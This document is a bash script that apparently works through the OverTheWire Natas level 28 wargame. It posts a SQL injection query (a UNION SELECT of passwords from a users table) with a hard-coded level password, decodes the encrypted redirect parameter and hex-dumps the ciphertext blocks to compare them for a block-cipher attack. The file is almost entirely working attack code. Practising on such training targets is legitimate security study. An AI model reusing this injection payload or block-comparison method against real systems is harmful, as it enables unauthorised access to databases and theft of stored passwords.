#!/bin/bash
urldecode() {
  echo "$1" | sed 's/+/ /g;s/%/\\x/g' | xargs -0 printf "%b"
}
result1=$(curl -u "natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" \
	-X POST "http://natas28.natas.labs.overthewire.org/index.php"\
	-d "query=AAAAAAAAA' UNION SELECT ALL password FROM users; -- "\
	-L \
	-o /dev/null \
	-w "%{url_effective}" | cut -d= -f2 )

result2=$(curl -u "natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" \
  -X POST "http://natas28.natas.labs.overthewire.org/index.php"\
  -d "query=AAAAAAAAAA" \
  -L \
	-o /dev/null \
	-w "%{url_effective}" | cut -d= -f2)
decoded1=$(urldecode "$result1")
decoded2=$(urldecode "$result2")

basi1=$(base64 -d <<< "$decoded1" > diff1.bin)
basi2=$(base64 -d <<< "$decoded2" > diff2.bin)
basi3=$(base64 -d <<< "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=" > diff3.bin)
xxd -g16 diff1.bin 
bytes1=$(wc -c diff1.bin);
bytes2=$(wc -c diff2.bin);
echo "$bytes1";
echo "$bytes2";
xxd -g16 diff2.bin
xxd -g16 diff3.bin
